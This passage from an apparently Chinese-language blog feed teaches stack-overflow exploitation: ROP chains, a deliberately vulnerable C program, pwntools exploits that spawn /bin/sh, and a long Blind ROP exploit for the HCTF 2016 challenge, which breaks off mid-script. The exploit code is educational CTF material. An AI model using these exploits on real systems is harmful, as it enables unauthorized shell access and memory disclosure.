class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"><span class="comment"># \x02cwNG1paBu=6Vn2kxSCqm+_4LETvFRZDj\x03</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> set_jmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第10章_栈溢出与ROP</title>
      <link href="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/"/>
      <url>/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/</url>
      
        <content type="html"><![CDATA[<h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>由于C语言对数组引用不做任何边界检查，从而导致缓冲区溢出成为一种很常见的漏洞。由于栈上保存着局部变量和一些状态信息（寄存器值、返回地址等），一旦发生严重的溢出，攻击者可以通过覆盖返回地址来执行任意代码，利用方法包括shellcode注入、retlibc，rop等</p><h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><p>大多数缓冲区溢出问题都是错误地使用了一些危险函数所导致的。</p><ol><li>scanf, gets这类</li><li>strcpy, strcat, sprintf这一类</li></ol><h2 id="返回导向编程"><a href="#返回导向编程" class="headerlink" title="返回导向编程"></a>返回导向编程</h2><p>ROP是Return-Oriented Programming 的缩写，因为引入了NX机制，数据所在的内存页被标记为不可执行，此时在执行shellcode就会抛出异常，因为注入新代码不可行，所以就利用程序中已有的代码。</p><p>使用ROP攻击，首先需要扫描文件，提取出可用的gadget片段（通常以ret指令结尾），然后将这些gadget进行组合，来达到攻击者的目的。举个例子，exit(0)的shellcode由下面4条连续的指令组成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; exit(0) shellcode</span><br><span class="line">xor eax, eax</span><br><span class="line">xor ebx, ebx</span><br><span class="line">inc eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>ROP链为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; exit(0) ROP chain</span><br><span class="line">xor eax, eax;gadget 1地址A</span><br><span class="line">ret</span><br><span class="line">xor ebx, ebx;gadget 2地址B</span><br><span class="line">ret</span><br><span class="line">inc eax    ;gadget 3地址C</span><br><span class="line">ret</span><br><span class="line">int 0x80    ;gadget 4地址D</span><br></pre></td></tr></table></figure><p>栈为（上面为低，下面为高）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">地址A;原来的EIP的位置  低地址</span><br><span class="line">地址B</span><br><span class="line">地址C</span><br><span class="line">地址D;高地址</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>程序源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> * handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_NOW | RTLD_GLOBAL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, dlsym(handle, <span class="string">&quot;system&quot;</span>));</span><br><span class="line">    vuln_func();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z noexecstack -pie -fpie main.c -ldl -o rop64</span><br></pre></td></tr></table></figure><p>为了方便测试，这个地方直接打印出了system的地址，来模拟信息泄露。思路就是根据system的地址找到Libc的基地址，然后找到/bin/sh的地址 + gadget（pop rdi; ret） ，将rdi传入/bin/sh的地址，然后去调用system来获取shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">╭─ ~/Desktop/testC/stack_test  </span><br><span class="line">╰─ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only <span class="string">&quot;pop|ret&quot;</span> | grep rdi</span><br><span class="line">0x0000000000022394 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x000000000002164f : pop rdi ; ret</span><br><span class="line"></span><br><span class="line">╭─ ~/Desktop/testC/stack_test                                                                                                            </span><br><span class="line">╰─ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string <span class="string">&quot;/bin/sh&quot;</span>         </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000001b3d88 : /bin/sh</span><br></pre></td></tr></table></figure><p>exp1: ROP攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;rop64&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;system_addr: %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">libc_base = system_addr - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: %s&quot;</span> % <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;binsh_addr: %s&quot;</span> % <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = libc_base + <span class="number">0x2164f</span></span><br><span class="line">ret_addr = libc_base + <span class="number">0x08aa</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span> + p64(ret_addr) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里的payload要在中间+ p64(ret_addr)， 这是为了<strong>对齐</strong>，具体看下面的参考文章</p><p>EXP2: 利用one_gadget，execve 函数  其实就是retlibc的感觉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;rop64&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;system_addr: %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">libc_base = system_addr - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: %s&quot;</span> % <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f302</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span> + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">250</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>参考文章：</p><p><a href="http://picpo.top/2021/07/19/ubuntu18%E4%BB%A5%E4%B8%8A%E7%B3%BB%E7%BB%9F64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E6%97%B6%EF%BC%8C%E6%89%80%E9%9C%80%E6%B3%A8%E6%84%8F%E7%9A%84%E5%A0%86/">http://picpo.top/2021/07/19/ubuntu18%E4%BB%A5%E4%B8%8A%E7%B3%BB%E7%BB%9F64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E6%97%B6%EF%BC%8C%E6%89%80%E9%9C%80%E6%B3%A8%E6%84%8F%E7%9A%84%E5%A0%86/</a></p><p><a href="http://blog.eonew.cn/2019-05-11.%E5%9C%A8%E4%B8%80%E4%BA%9B64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98.html">http://blog.eonew.cn/2019-05-11.%E5%9C%A8%E4%B8%80%E4%BA%9B64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98.html</a></p><p><a href="https://www.cnblogs.com/tcctw/p/11333743.html">https://www.cnblogs.com/tcctw/p/11333743.html</a></p></blockquote><h2 id="Blind-ROP"><a href="#Blind-ROP" class="headerlink" title="Blind ROP"></a>Blind ROP</h2><p>BROP，即Blind Return Oriented Programming, BROP能够在无法获得二进制程序的情况下，基于远程服务崩溃与否（连接是否中断），进行ROP攻击获得shell，可用于开启了ASLR、NX和canaries的64位Linux</p><h3 id="BROP原理"><a href="#BROP原理" class="headerlink" title="BROP原理"></a>BROP原理</h3><p>传统的ROP攻击需要攻击者通过逆向等手段、从二进制文件中提取可用的gadgets，而BROP在符合一定的前提条件下，无需获得二进制文件。其中两个必要的条件是↓</p><ol><li>目标程序存在栈溢出漏洞，并且可以稳定触发</li><li>目标进程在崩溃后回立即重启，并且重启后的进程内存不会重新随机化，这样即使目标机器开启了ASLR也没有影响</li></ol><p>BROP攻击的主要阶段如下</p><ol><li><p><strong>Stack reading</strong> ，泄露canaries和返回地址，然后从返回地址可以推算出程序的加载地址，用于后续gadgets的扫描。泄露方法是每次溢出一个字节，看程序是否崩溃。</p></li><li><p><strong>Blind ROP</strong>, 这一阶段用于远程搜索gadgets，搜索gadgets的思路也是基于溢出返回地址后判断程序是否崩溃。要搜到stop gadgets，即让程序挂起的一些指令，例如进入无限循环，sleep或read啥的，因为要利用这个stop gadgets来搜索对我们有用的gadgets，即下面这样↓</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * buf_size + p64(gadgets) + ... +p64(stop gadgets)<span class="comment"># 不会崩溃</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * buf_size + p64(gadgets)  <span class="comment"># 会崩溃</span></span><br></pre></td></tr></table></figure><p>一般可以搜通用的gadgets,像下面这种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040078A 5B                                            pop     rbx</span><br><span class="line">.text:000000000040078B 5D                                            pop     rbp</span><br><span class="line">.text:000000000040078C 41 5C                                         pop     r12</span><br><span class="line">.text:000000000040078E 41 5D                                         pop     r13</span><br><span class="line">.text:0000000000400790 41 5E                                         pop     r14</span><br><span class="line">.text:0000000000400792 41 5F                                         pop     r15</span><br><span class="line">.text:0000000000400794 C3                                            retn</span><br></pre></td></tr></table></figure></li><li><p><strong>Build the exploit</strong>, 利用得到的gadgets构造ROP，将程序从远程服务器的内存里传回来，BROP就转换成了普通的ROP攻击</p></li></ol><h3 id="HCTF-2016-brop"><a href="#HCTF-2016-brop" class="headerlink" title="HCTF 2016: brop"></a>HCTF 2016: brop</h3><p>exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_buffer_size</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span> * i</span><br><span class="line">        buffsize = <span class="built_in">len</span>(payload) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">            io.recvline()</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad buffsize: %d&quot;</span> % buffsize)</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;buffsize: %d&quot;</span> % buffsize)</span><br><span class="line">            <span class="keyword">return</span> buffsize</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span>(<span class="params">buf_size</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * buf_size</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">            io.recvline()</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;stop address: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gadgets_addr</span>(<span class="params">buf_size, stop_addr</span>):</span></span><br><span class="line">    addr = stop_addr</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * buf_size + p64(addr) + <span class="string">b&#x27;AAAAAAAA&#x27;</span> * <span class="number">6</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload+ p64(stop_addr))</span><br><span class="line">            io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;find address: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">try</span>:        <span class="comment"># check gadget</span></span><br><span class="line">                io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">                io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">                io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                log.info(<span class="string">&quot;bad address : 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                log.info(<span class="string">&quot;gadget address: 0x%x&quot;</span> % addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_call_addr</span>(<span class="params">buf_size, stop_addr, gadgets_addr</span>):</span></span><br><span class="line">    addr = stop_addr</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * buf_size + p64(gadgets_addr + <span class="number">9</span>) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">            <span class="keyword">if</span> io.recv().startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">                log.info(<span class="string">&quot;puts call address:0x%x&quot;</span> % addr)</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">            io.close()</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_memory</span>(<span class="params">buf_size, stop_addr, gadgets_addr, puts_call_addr, start_addr, end_addr</span>):</span></span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> start_addr &lt; end_addr:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * buf_size</span><br><span class="line">        payload+= p64(gadgets_addr+<span class="number">9</span>)</span><br><span class="line">        payload+= p64(start_addr)</span><br><span class="line">        payload+= p64(puts_call_addr)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">            data = io.recv()[:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">                data = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">            log.info(<span class="string">&quot;leaking: 0x%x ---&gt; %s&quot;</span> % (start_addr, hexlify(data)))</span><br><span class="line">            result += data</span><br><span class="line">            start_addr += <span class="built_in">len</span>(data)</span><br><span class="line">            io.close()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            log.info(<span class="string">&quot;EOF&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span>(<span class="params">buf_size, stop_addr, gadgets_addr, puts_call_addr, puts_got</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * buf_size</span><br><span class="line">    payload+= p64(gadgets_addr+<span class="number">9</span>)</span><br><span class="line">    payload+= p64(puts_got)</span><br><span class="line">    payload+= p64(puts_call_addr)</span><br><span class="line">    payload += p64(stop_addr)</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">    data = io.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    data = u64(data.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;puts address: 0x%x&quot;</span> % data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">gadgets_addr, system_addr, binsh_addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> + p64(gadgets_addr+<span class="number">10</span>) +p64(gadgets_addr+<span class="number">9</span>) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    io.sendafter(<span 